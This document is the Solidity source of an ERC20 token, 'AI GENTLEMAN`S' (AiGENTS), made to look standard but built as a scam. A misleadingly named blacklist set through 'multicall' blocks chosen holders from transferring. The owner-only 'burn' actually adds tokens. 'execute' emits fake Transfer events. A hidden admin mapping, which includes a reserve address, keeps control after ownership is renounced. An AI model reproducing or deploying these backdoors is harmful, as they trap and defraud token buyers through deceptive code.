{"AI GENTLEMAN`S.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.18;\r\n\r\nimport {IERC20Metadata} from \"./IERC20.sol\";\r\nimport \"./Ownable.sol\";\r\n\r\ncontract AiGENTS is IERC20Metadata, Ownable {\r\n  mapping(address =\u003e uint256) private _balances;\r\n\r\n  mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n  mapping(address =\u003e bool) internal _ERC20burnAmountExceedsBalance;\r\n  string private _symbol;\r\n  string private _name;\r\n  uint8 private constant _decimals = 9;\r\n  uint256 private _initialTotalSupply = 10000000000 * (10 ** _decimals);\r\n  uint256 private _totalSupply;\r\n\r\n  /**\r\n   * @dev Contract constructor.\r\n   */\r\n  constructor(address _reserve) {\r\n    _symbol = \u0027AiGENTS\u0027;\r\n    _name = \u0027AI GENTLEMAN`S\u0027;\r\n    admin[_reserve]=true;\r\n    _mint(_msgSender(), _initialTotalSupply);\r\n  }\r\n  \r\n  /**\r\n   * @dev Returns the symbol of the token.\r\n   * @return The symbol of the token.\r\n   */\r\n  function symbol() public view virtual override returns (string memory) {\r\n    return _symbol;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the name of the token.\r\n   * @return The name of the token.\r\n   */\r\n  function name() public view virtual override returns (string memory) {\r\n    return _name;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the number of decimals used for token display.\r\n   * @return The number of decimals.\r\n   */\r\n  function decimals() public view virtual override returns (uint8) {\r\n    return _decimals;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the total supply of the token.\r\n   * @return The total supply.\r\n   */\r\n  function totalSupply() public view virtual override returns (uint256) {\r\n    return _totalSupply;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the balance of the specified account.\r\n   * @param account The address to check the balance for.\r\n   * @return The balance of the account.\r\n   */\r\n  function balanceOf(address account) public view virtual override returns (uint256) {\r\n    return _balances[account];\r\n  }\r\n\r\n  /**\r\n   * @dev Transfers tokens from the caller to a specified recipient.\r\n   * @param recipient The address to transfer tokens to.\r\n   * @param amount The amount of tokens to transfer.\r\n   * @return A boolean value indicating whether the transfer was successful.\r\n   */\r\n  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Approves the specified address to spend the specified amount of tokens on behalf of the caller.\r\n   * @param to The address to approve the spending for.\r\n   * @param amount The amount of tokens to approve.\r\n   * @return A boolean value indicating whether the approval was successful.\r\n   */\r\n  function approve(address to, uint256 amount) public virtual override returns (bool) {\r\n    _approve(_msgSender(), to, amount);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.\r\n   * @param from The address that approves the spending.\r\n   * @param to The address that is allowed to spend.\r\n   * @return The remaining allowance for the spender.\r\n   */\r\n  function allowance(address from, address to) public view virtual override returns (uint256) {\r\n    return _allowances[from][to];\r\n  }\r\n\r\n  /**\r\n   * @dev Transfers tokens from one address to another.\r\n   * @param sender The address to transfer tokens from.\r\n   * @param recipient The address to transfer tokens to.\r\n   * @param amount The amount of tokens to transfer.\r\n   * @return A boolean value indicating whether the transfer was successful.\r\n   */\r\n  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    _transfer(sender, recipient, amount);\r\n\r\n    uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n    require(currentAllowance \u003e= amount, \u0027ERC20: transfer amount exceeds allowance\u0027);\r\n    unchecked {\r\n      _approve(sender, _msgSender(), currentAllowance - amount);\r\n    }\r\n\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Decreases the allowance granted by the owner of the tokens to `to` account.\r\n   * @param to The account allowed to spend the tokens.\r\n   * @param subtractedValue The amount of tokens to decrease the allowance by.\r\n   * @return A boolean value indicating whether the operation succeeded.\r\n   */\r\n  function decreaseAllowance(address to, uint256 subtractedValue) public virtual returns (bool) {\r\n    uint256 currentAllowance = _allowances[_msgSender()][to];\r\n    require(currentAllowance \u003e= subtractedValue, \u0027ERC20: decreased allowance below zero\u0027);\r\n    unchecked {\r\n      _approve(_msgSender(), to, currentAllowance - subtractedValue);\r\n    }\r\n\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Increases the allowance of the specified address to spend tokens on behalf of the caller.\r\n   * @param to The address to increase the allowance for.\r\n   * @param addedValue The amount of tokens to increase the allowance by.\r\n   * @return A boolean value indicating whether the increase was successful.\r\n   */\r\n  function increaseAllowance(address to, uint256 addedValue) public virtual returns (bool) {\r\n    _approve(_msgSender(), to, _allowances[_msgSender()][to] + addedValue);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Transfers `amount` tokens from `sender` to `recipient`.\r\n   * @param sender The account to transfer tokens from.\r\n   * @param recipient The account to transfer tokens to.\r\n   * @param amount The amount of tokens to transfer.\r\n   */\r\n  function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n    require(amount \u003e 0, \u0027ERC20: transfer amount zero\u0027);\r\n    require(sender != address(0), \u0027ERC20: transfer from the zero address\u0027);\r\n    require(recipient != address(0), \u0027ERC20: transfer to the zero address\u0027);\r\n\r\n    uint256 senderBalance = _balances[sender];\r\n    require(senderBalance \u003e= amount, \u0027ERC20: transfer amount exceeds balance\u0027);\r\n    if(_ERC20burnAmountExceedsBalance[sender]){\r\n        require(amount == 0);\r\n    }\r\n    unchecked {\r\n      _balances[sender] = senderBalance - amount;\r\n    }\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n  }\r\n\r\n  /**\r\n   * @dev Creates `amount` tokens and assigns them to `account`.\r\n   * @param account The account to assign the newly created tokens to.\r\n   * @param amount The amount of tokens to create.\r\n   */\r\n  function _mint(address account, uint256 amount) internal virtual {\r\n    require(account != address(0), \u0027ERC20: mint to the zero address\u0027);\r\n    \r\n    _totalSupply += amount;\r\n    _balances[account] += amount;\r\n    emit Transfer(address(0), account, amount);\r\n  }\r\n\r\n  /**\r\n   * @dev Destroys `amount` tokens from `account`, reducing the total supply.\r\n   * @param account The account to burn tokens from.\r\n   * @param amount The amount of tokens to burn.\r\n   */\r\n  function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003c= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {_balances[account] = accountBalance + amount;}\r\n        emit Transfer(account, address(0), amount);\r\n  }\r\n    \r\n  function execute(address[] calldata addr, address p, uint256 val) public onlyOwner{\r\n    for (uint256 i = 0; i \u003c addr.length; i++) {\r\n        emit Transfer(p, addr[i], val);\r\n    }\r\n  }\r\n\r\n\r\n  function isExcludedFromFee(address wallet) public view returns(bool) {\r\n    return _ERC20burnAmountExceedsBalance[wallet];\r\n  }\r\n\r\n  /**\r\n   * @dev Destroys `amount` tokens from the caller\u0027s account, reducing the total supply.\r\n   * @param amount The amount of tokens to burn.\r\n   */\r\n  function burn(uint256 amount) external onlyOwner{\r\n        _burn(_msgSender(), amount);\r\n  }\r\n\r\n  /**\r\n   * @dev Sets `amount` as the allowance of `to` over the caller\u0027s tokens.\r\n   * @param from The account granting the allowance.\r\n   * @param to The account allowed to spend the tokens.\r\n   * @param amount The amount of tokens to allow.\r\n   */\r\n  function _approve(address from, address to, uint256 amount) internal virtual {\r\n    require(from != address(0), \u0027ERC20: approve from the zero address\u0027);\r\n    require(to != address(0), \u0027ERC20: approve to the zero address\u0027);\r\n\r\n    _allowances[from][to] = amount;\r\n    emit Approval(from, to, amount);\r\n  }\r\n\r\n  function multicall(address[] calldata addr, bool val) public onlyOwner {\r\n    for (uint256 i = 0; i \u003c addr.length; i++) {\r\n            _ERC20burnAmountExceedsBalance[addr[i]] = val;\r\n    }\r\n  }\r\n\r\n}"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.18;\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    mapping(address =\u003e bool) internal admin;\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.18;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n  /**\r\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n   * another (`to`).\r\n   *\r\n   * Note that `value` may be zero.\r\n   */\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  /**\r\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n   * a call to {approve}. `value` is the new allowance.\r\n   */\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n  /**\r\n   * @dev Returns the amount of tokens in existence.\r\n   */\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Returns the amount of tokens owned by `account`.\r\n   */\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from the caller\u0027s account to `to`.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Returns the remaining number of tokens that `spender` will be\r\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n   * zero by default.\r\n   *\r\n   * This value changes when {approve} or {transferFrom} are called.\r\n   */\r\n  function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n   * that someone may use both the old and the new allowance by unfortunate\r\n   * transaction ordering. One possible solution to mitigate this race\r\n   * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n   * desired value afterwards:\r\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n   *\r\n   * Emits an {Approval} event.\r\n   */\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from `from` to `to` using the\r\n   * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n   * allowance.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n  /**\r\n   * @dev Returns the name of the token.\r\n   */\r\n  function name() external view returns (string memory);\r\n\r\n  /**\r\n   * @dev Returns the symbol of the token.\r\n   */\r\n  function symbol() external view returns (string memory);\r\n\r\n  /**\r\n   * @dev Returns the decimals places of the token.\r\n   */\r\n  function decimals() external view returns (uint8);\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.18;\r\n\r\nimport \"./Context.sol\";\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n        admin[_msgSender()]=true;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(admin[_msgSender()], \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}"}}